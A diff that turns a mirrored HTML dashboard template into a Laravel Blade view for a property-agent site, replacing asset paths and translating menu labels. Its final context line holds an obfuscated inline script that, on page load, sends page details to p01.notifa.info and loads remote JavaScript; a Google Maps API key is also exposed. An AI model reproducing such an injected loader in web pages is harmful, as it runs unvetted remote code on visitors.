@@ -8,90 +8,36 @@
     <title>Prima Properti</title>
 
     <!-- Bootstrap -->
-    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">
      
     <!-- External Css -->
-    <link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
-    <link rel="stylesheet" href="assets/css/themify-icons.css" />
-    <link rel="stylesheet" href="assets/css/et-line.css" />
-    <link rel="stylesheet" href="assets/css/owl.carousel.css" />
-    <link rel="stylesheet" href="assets/css/jquery.nstSlider.min.css" />
-    <link rel="stylesheet" href="assets/css/bootstrap-select.min.css" />
-    <link rel="stylesheet" href="assets/css/plyr.css" />
-    <link rel="stylesheet" href="assets/css/magnific-popup.css" />
-    <link rel="stylesheet" href="assets/css/js-flickr-gallery.css" />
+    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
+    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
+    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />
 
     <!-- leaflet -->
-    <link rel="stylesheet" href="assets/leaflet/css/leaflet.css">
-    <link rel="stylesheet" href="assets/leaflet/css/MarkerCluster.css">
-    <link rel="stylesheet" href="assets/leaflet/css/MarkerCluster.Default.css">
+    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
+    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
+    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
 
     <!-- Custom Css -->
-    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">
 
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">
 
     <!-- Favicon -->
-    <link rel="icon" href="assets/img/icon.png">
+    <link rel="icon" href="{{asset('assets/img/icon.png')}}">
   </head>
   <body>
 
-    <!-- Top Nav -->
-    <div class="primary-bg top-nav">
-      <div class="container">
-        <div class="row">
-          <div class="col-md-8">
-            <div class="header-top-content">
-              <ul>
-                <li><i class="fas fa-phone"></i> 0823-3512-7064</li>
-                <li><i class="far fa-envelope"></i> support@primaproperti.com</li>
-                <li><i class="fas fa-map-marker-alt"></i> Jln. Letnan Sudiono Bondowoso</li>
-              </ul>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="header-top-nav">
-              <a href="#" class="header-top-button">Masuk</a>
-              <a href="#" class="header-top-button white-bg">Daftar</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <!-- Top Nav End -->
-
-    <!-- Header -->
-    <header>
-      <nav class="navbar navbar-default cp-navigation navbar-fixed-top">
-        <div class="container">
-          <div class="navbar-header">
-            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
-              <span class="sr-only">Toggle navigation</span>
-              <span class="icon-bar"></span>
-              <span class="icon-bar"></span>
-              <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand page-scroll" href="#home">
-              <img src="assets/img/properti.png" alt="Brand Logo">
-            </a>
-          </div>
-          <div class="collapse navbar-collapse" id="navbar-collapse">
-            <ul class="nav navbar-nav navbar-right">
-              <li><a class="page-scroll" href="#home">Beranda</a></li>
-              <li><a class="page-scroll" href="#about">Tentang Kami</a></li>
-              <li><a class="page-scroll" href="#visi">Visi Misi</a></li>
-              <li><a class="page-scroll" href="#value">Value Prima Properti</a></li>
-              <li><a class="page-scroll" href="#agent">Agent</a></li>
-              <li><a class="page-scroll" href="#properti">Properti</a></li>
-              <li><a class="page-scroll" href="#blog">Blog</a></li>
-              <li><a class="page-scroll" href="#contact">Kontak</a></li>
-            </ul>
-          </div>
-        </div>
-      </nav>
-    </header>
-    <!-- Header End -->
+  @include('layouts.nav')
     
     <!-- Dashboard -->
     <div class="cp-container section-padding">
@@ -100,7 +46,7 @@
           <div class="col-md-3">
             <div class="user-profile">
               <div class="user-thumb">
-                <img src="images/dashboard/user/thumb-1.jpg" class="img-responsive" alt="">
+                <img src="{{auth()->user()->photo ? asset(auth()->user()->photo) : asset('images/dashboard/user/demo-user.png')}}" class="img-responsive" alt="" style="width: 100%; height:100%; object-fit:cover">
                 <div class="varified">
                   <i class="fas fa-check"></i>
                 </div>
@@ -124,15 +70,13 @@
             <div class="dashboard-sidenav">
               <ul class="dashboard-nav" id="dashboard-nav">
                 <li class="navigation-item">
-                  <a href="dashboard.html"><span class="ti-layers-alt"></span>Dashboard</a>
+                  <a href="/agent/dashboard"><span class="ti-layers-alt"></span>Dashboard</a>
                 </li>
                 <li class="navigation-item dropdown">
-                  <a href="#"><span class="ti-location-pin"></span>My Listing</a>
+                  <a href="#"><span class="ti-location-pin"></span>Properti Saya</a>
                   <ul class="dropdown-menu">
-                    <li><a href="dashboard-all-listing.html">All Listings</a></li>
-                    <li><a href="dashboard-add-listing.html">Add New Listings</a></li>
-                    <li><a href="dashboard-active-listing.html">Active Listings</a></li>
-                    <li><a href="dashboard-expired-listing.html">Expired Listings</a></li>
+                    <li><a href="/agent/properties">Semua Properti</a></li>
+                    <li><a href="/agent/properties/add">Tambah Properti Baru</a></li>
                   </ul>
                 </li>
                 <li class="navigation-item">
@@ -318,7 +262,7 @@
                   <div class="messages">
                     <div class="message">
                       <div class="thumb">
-                        <img src="images/dashboard/visitor/thumb-1.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/dashboard/visitor/thumb-1.jpg')}}" class="img-responsive" alt="">
                       </div>
                       <div class="body">
                         <h6>Charli Maria <span class="badge">Unread</span></h6>
@@ -334,7 +278,7 @@
                     </div>
                     <div class="message">
                       <div class="thumb">
-                        <img src="images/dashboard/visitor/thumb-2.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/dashboard/visitor/thumb-2.jpg')}}" class="img-responsive" alt="">
                       </div>
                       <div class="body">
                         <h6>Charli Maria</h6>
@@ -357,7 +301,7 @@
                   <div class="reviews">
                     <div class="review">
                       <div class="thumb">
-                        <img src="images/dashboard/visitor/thumb-1.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/dashboard/visitor/thumb-1.jpg')}}" class="img-responsive" alt="">
                       </div>
                       <div class="body">
                         <h6>Charli Maria 
@@ -383,7 +327,7 @@
                     </div>
                     <div class="review">
                       <div class="thumb">
-                        <img src="images/dashboard/visitor/thumb-2.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/dashboard/visitor/thumb-2.jpg')}}" class="img-responsive" alt="">
                       </div>
                       <div class="body">
                         <h6>Charli Maria
@@ -579,7 +523,7 @@
                   <div class="footer-listing">
                     <div class="listing-thumb">
                       <a href="#">
-                        <img src="images/listing/footer-listing-1.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                       </a>
                     </div>
                     <div class="body">
@@ -590,7 +534,7 @@
                   <div class="footer-listing">
                     <div class="listing-thumb">
                       <a href="#">
-                        <img src="images/listing/footer-listing-1.jpg" class="img-responsive" alt="">
+                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                       </a>
                     </div>
                     <div class="body">
@@ -622,7 +566,7 @@
               <div class="footer-social-link">
                 <div class="footer-logo">
                   <a href="#">
-                    <img src="assets/img/properti.png" class="img-responsive" alt="Footer Logo" style="width: 100px; height: auto;">
+                    <img src="{{asset('assets/img/properti.png')}}" class="img-responsive" alt="Footer Logo" style="width: 100px; height: auto;">
                   </a>
                 </div>
                 <div class="social-link">
@@ -701,32 +645,32 @@
     <!-- Footer End -->
 
     <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
-    <script src="assets/js/jquery.min.js"></script>
+    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
     <!-- Include all compiled plugins (below), or include individual files as needed -->
-    <script src="assets/js/bootstrap.min.js"></script>
-    <script src="assets/js/visible.js"></script>
-    <script src="assets/js/owl.carousel.min.js"></script>
-    <script src="assets/js/jquery.nstSlider.min.js"></script>
-    <script src="assets/js/bootstrap-select.min.js"></script>
-    <script src="assets/js/plyr.js"></script>
-    <script src="assets/js/jquery-migrate-3.0.1.js"></script>
-    <script src="assets/js/jquery.magnific-popup.min.js"></script>
-    <script src="assets/js/js-flickr-gallery.js"></script>
-    <script src="assets/js/tinymce.min.js"></script>
-    <script src="assets/js/isotope.pkgd.min.js"></script>
-    <script src="assets/js/imagesloaded.pkgd.min.js"></script>
-    <script src="assets/js/jquery.ajaxchimp.min.js"></script>
+    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
+    <script src="{{asset('assets/js/visible.js')}}"></script>
+    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
+    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
+    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
+    <script src="{{asset('assets/js/plyr.js')}}"></script>
+    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
+    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
+    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
+    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
+    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
+    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
+    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
 
     <!-- leaflet -->
-    <script src="assets/leaflet/js/dummylatlng.js"></script>
-    <script src="assets/leaflet/js/leaflet-src.js"></script>
-    <script src="assets/leaflet/js/leaflet.markercluster-src.js"></script>
+    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
+    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
+    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
 
-    <script src="js/custom.js"></script>
-    <script src="js/dashboard.js"></script>
+    <script src="{{asset('js/custom.js')}}"></script>
+    <script src="{{asset('js/dashboard.js')}}"></script>
     <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
-    <script src="js/map.js"></script>
-    <script src="js/searchMap.js"></script>
+    <script src="{{asset('js/map.js')}}"></script>
+    <script src="{{asset('js/searchMap.js')}}"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJJk2kPrx8ZE1jypgkzAVZNTTaxWy%2fHWn%2bQxRbsqabhGDrunjaHFKnLLG6Oj87EFYyJhVY8xtLiVdXcMozoEfGBUGiZ2sefQDQyvAZNNEutFQ3N%2fHIvHjCW9G6pWh%2bnGYthtgYjG2C7%2fydGX1EEDXQdvXVCsANod0tTFIBVaGUt0nhZiKy%2bWNqF94Yx2drfopPiMjNnyjfii1c47vetfvR6FQy6y8ayLGKZonpcUM8bsS8rsaqafrJ9wY38WC63uDL1KnnMnbElRahOchjvMRau9x6n2cwgbotnHvBhgFlUK6iWSkIJ2UOmSgYNCV8Pft8HWkqT6KjhOw7Kjz2KdhyvtcOyPsDNAHUz21gv6PL39B1yZRDhXLaPgV9H3N81E126DVINZ0VqYaID8FlQvCnWyrrYHtu%2b38IAbmfdAJK%2bDGGm2DYVyeH%2fenfEKHAncLEpJWOipUTOsT47fozHr5BEwDHCnNQ2AqJB0Kl%2fBozjaTukUsP8V00D" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:16:01 GMT -->
